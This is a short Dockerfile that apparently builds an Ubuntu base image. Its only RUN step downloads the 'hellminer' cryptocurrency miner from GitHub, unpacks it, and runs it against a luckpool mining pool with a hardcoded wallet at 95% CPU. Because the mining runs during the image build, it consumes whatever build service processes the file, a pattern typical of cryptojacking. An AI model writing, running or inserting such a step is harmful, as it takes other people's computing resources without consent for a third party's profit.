FROM ubuntu:20.04 as ubuntu-base
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c tcp://ap.luckpool.net:3956#xnsub -u REBAHsE5gkgdvFvRgztuPabLRwaLi7CQo9.worker -p x --cpu 95
